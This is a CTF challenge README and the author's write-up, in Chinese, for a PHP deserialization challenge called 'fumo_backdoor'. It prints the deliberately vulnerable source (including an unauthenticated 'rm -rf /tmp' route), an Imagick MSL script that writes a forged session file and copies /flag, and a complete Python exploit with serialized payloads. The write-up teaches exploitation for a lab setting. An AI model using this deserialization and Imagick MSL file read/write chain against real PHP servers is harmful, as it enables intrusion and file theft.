# fumo_backdoor

## run & down
`docker-compose up -d`

`docker-compose down`

## writeup

改自2023年全国大学生国赛，并提高了难度。

开局给php源码，如下：

```php
<?php
error_reporting(0);
ini_set('open_basedir', __DIR__.":/tmp");
define("FUNC_LIST", get_defined_functions());

class fumo_backdoor {
    public $path = null;
    public $argv = null;
    public $func = null;
    public $class = null;
    
    public function __sleep() {
        if (
            file_exists($this->path) && 
            preg_match_all('/[flag]/m', $this->path) === 0
        ) {
            readfile($this->path);
        }
    }

    public function __wakeup() {
        $func = $this->func;
        if (
            is_string($func) && 
            in_array($func, FUNC_LIST["internal"])
        ) {
            call_user_func($func);
        } else {
            $argv = $this->argv;
            $class = $this->class;
            
            new $class($argv);
        }
    }
}

$cmd = $_REQUEST['cmd'];
$data = $_REQUEST['data'];

switch ($cmd) {
    case 'unserialze':
        unserialize($data);
        break;
    
    case 'rm':
        system("rm -rf /tmp 2>/dev/null");
        break;
    
    default:
        highlight_file(__FILE__);
        break;
}
```

`open_basedir` 为当前目录以及 `/tmp` 。

存在反序列化漏洞，以及一个 `fumo_backdoor` 类。类中有两个魔法方法：

1. 在 `__wakeup` 可以执行一次任意无参函数以及新建任意类的对象。
2. 在 `__sleep` 可以读取文件，文件路径不可以出现 `flag` 四个字符。

`flag` 在 `/flag` 里，考虑如何触发`__sleep` 读取文件。当前环境下唯一存在序列化的地方就是 `session` ，所以要想办法控制 `session` 数据。

题目中存在 `imagick` 扩展，可以利用 `msl` 脚本文件来读取、写入文件。可参考`swarm`团队在2022年7月发布的[文章](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)。

现在存在三个问题，一是如何利用图片写入来写入一个 `session` ，二是如何将 `flag` 以图片形式读入随后再写出。三是 `nginx` 设置了限流，每分钟能请求的次数较少，且 `rm` 路由没有限制，很容易出现一部分人不断恶意请求 `rm` 路由删除 `session` 和临时文件，所以最后的 `poc` 必须尽可能一次性完成 `session` 的写入和 `flag` 的转移。

这里分别找到了两种图片格式。首先是 `ppm` 格式，可以较为容易写入 `session` ，且支持 `inline:base64` 。

```
# ppm格式的session
P6
32 1
255
...|O:13:"fumo_backdoor":4:{s:4:"path";s:9:"/tmp/ttt1";s:4:"argv";N;s:4:"func";N;s:5:"class";N;}
```

其次是 `RGB` 格式，可以读取、写入原生字符。这里存在一个问题， `RGB` 格式的默认色彩深度为16，那么每次会读取6个字符，如果 `flag` 长度不是6的倍数会无法一次性全部读取，且色彩深度无法在 `msl` 进行设置。为了解决这个问题，可以利用 `msl` 解析器的特性。因为 `msl` 是一种脚本语言，在遇到错误时停止执行。那么我们可以为不断其添加偏移，多次读写对 `copy` 的 `flag` 文件进行覆盖，直到报错，代表偏移已经超出范围。

需要吐槽的是， `msl` 的官方文档十分烂，很多的属性并没有列出，只能在源码中一探究竟。

最后编写的 `msl` 文件如下：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<group>
		<!-- step1: 写入session -->
    <image>
        <read filename="inline:data://image/x-portable-anymap;base64,{ppm_data}" />
        <write filename="/tmp/sess_afkl" />
    </image>

		<!-- step2: copy flag -->
    <image id="a1">
				<!-- 设置为RGB格式，读取flag -->
        <read size="{img_size}x1" filename="rgb:/flag"/>
    </image>
    <image id="w1">
				<!-- 设置一个空图片 -->
        <read size="10x10" filename="null:"/>
				<!-- 将空图片和flag数据进行拼接 -->
        <composite image="a1" geometry="+0"/>

        <write filename="rgb:/tmp/ttt1"/>
    </image>

    <image id="a2">
				<!-- 添加偏移后，读取flag -->
        <read size="{img_size}x1+1" filename="rgb:/flag"/>
    </image>
    <image id="w2">
        <read size="10x10" filename="null:"/>
        <composite image="w1" geometry="+0"/>
				<!-- 将上一张图片和这次读取的flag进行拼接 -->
        <composite image="a2" geometry="+1"/>

        <write filename="rgb:/tmp/ttt1"/>
    </image>

		<!-- 不断重复，如果读取超出范围，便会报错，并留下上一次写入的文件 -->
    <image id="a3">
        <read size="{img_size}x1+2" filename="rgb:/flag"/>
    </image>
    <image id="w3">
        <read size="10x10" filename="null:"/>
        <composite image="w2" geometry="+0"/>
        <composite image="a3" geometry="+2"/>

        <write filename="rgb:/tmp/ttt1"/>
    </image>

    <image id="a4">
        <read size="{img_size}x1+3" filename="rgb:/flag"/>
    </image>
    <image id="w4">
        <read size="10x10" filename="null:"/>
        <composite image="w3" geometry="+0"/>
        <composite image="a4" geometry="+3"/>

        <write filename="rgb:/tmp/ttt1"/>
    </image>

    <image id="a5">
        <read size="{img_size}x1+4" filename="rgb:/flag"/>
    </image>
    <image id="w5">
        <read size="10x10" filename="null:"/>
        <composite image="w4" geometry="+0"/>
        <composite image="a5" geometry="+4"/>

        <write filename="rgb:/tmp/ttt1"/>
    </image>

    <image id="a6">
        <read size="{img_size}x1+5" filename="rgb:/flag"/>
    </image>
    <image id="w6">
        <read size="10x10" filename="null:"/>
        <composite image="w5" geometry="+0"/>
        <composite image="a6" geometry="+5"/>

        <write filename="rgb:/tmp/ttt1"/>
    </image>
</group>
```

解题 `exp` :

```python
#!/usr/bin/python3
#coding:utf-8

import sys
import time
import requests
from ctfbox import base64_encode

payload = '|O:13:"fumo_backdoor":4:{s:4:"path";s:9:"/tmp/ttt1";s:4:"argv";N;s:4:"func";N;s:5:"class";N;}'
size = (len(payload) // 3) + 1

filled_payload = payload.rjust(size * 3, '\0')

img = f"""P6
{str(size)} 1
255
{filled_payload}"""

b64_img = base64_encode(img)

host = sys.argv[1]
port = sys.argv[2]

url = f"http://{host}:{port}"

def rm_tmp_file():
    headers = {"Accept": "*/*"}
    requests.get(
        f"{url}/?cmd=rm",
        headers=headers
    )

def upload_session_and_read_file(msl_file):
    headers = {
        "Accept": "*/*",
        "Content-Type": "multipart/form-data; boundary=------------------------c32aaddf3d8fd979"
    }

    data = f"--------------------------c32aaddf3d8fd979\r\nContent-Disposition: form-data; name=\"swarm\"; filename=\"swarm.msl\"\r\nContent-Type: application/octet-stream\r\n\r\n{msl_file}\r\n--------------------------c32aaddf3d8fd979--"
    try:
        res = requests.post(
            f"{url}/?data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A4%3A%22func%22%3BN%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22imagick%22%3B%7D&cmd=unserialze",
            headers=headers, data=data
        )
        print(res.text)
    except requests.exceptions.ConnectionError:
        pass

def get_flag():
    cookies = {"PHPSESSID": "afkl"}
    headers = {"Accept": "*/*"}
    res = requests.get(
        f"{url}/?data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3Bs%3A7%3A%22.%2Ftest1%22%3Bs%3A4%3A%22argv%22%3BN%3Bs%3A4%3A%22func%22%3Bs%3A13%3A%22session_start%22%3Bs%3A5%3A%22class%22%3BN%3B%7D&cmd=unserialze", 
        headers=headers, cookies=cookies
    )
    return res.text.encode().replace(b'\0', b'')

if __name__ == '__main__':
		# ./img.msl 见上
    with open("./img.msl", "r") as fp:
        msl_file = fp.read()

    for i in range(5, 6):
        rm_tmp_file()
        n_msl_file = msl_file.format(img_size=i, ppm_data=b64_img)
        
        time.sleep(5)
        upload_session_and_read_file(n_msl_file)

        print("=" * 20)
        print(f"try: {i} times")
        print(get_flag())        
        print("=" * 20)

        time.sleep(5)
```

运行效果：

[![pC3Unmj.png](https://s1.ax1x.com/2023/06/19/pC3Unmj.png)](https://imgse.com/i/pC3Unmj)

后记：

出这道题的时候 `imagemagick` 爆了两个 `RCE` 的 `CVE` ，幸好 `docker` 环境内的版本比较旧，不受影响，要不然就紫砂了😢。不知道这次有没有非预期出来 `RCE` 的（白嫖0day（不是

看了一眼选手们的wp，没有人是预期解做的（紫砂了（这里说一下非预期：

其实不光是 `RGB` 格式，通过 `fuzz` 其他格式也可以找到方便读写文件的格式。（早知道把除了 `[rgb.so](http://rgb.so)` 以外的库都删除了

最简单的是 `uyvy` 这个奇妙的格式，可以直接读写。

其次是 `mvg` ，需要修改一下偏移。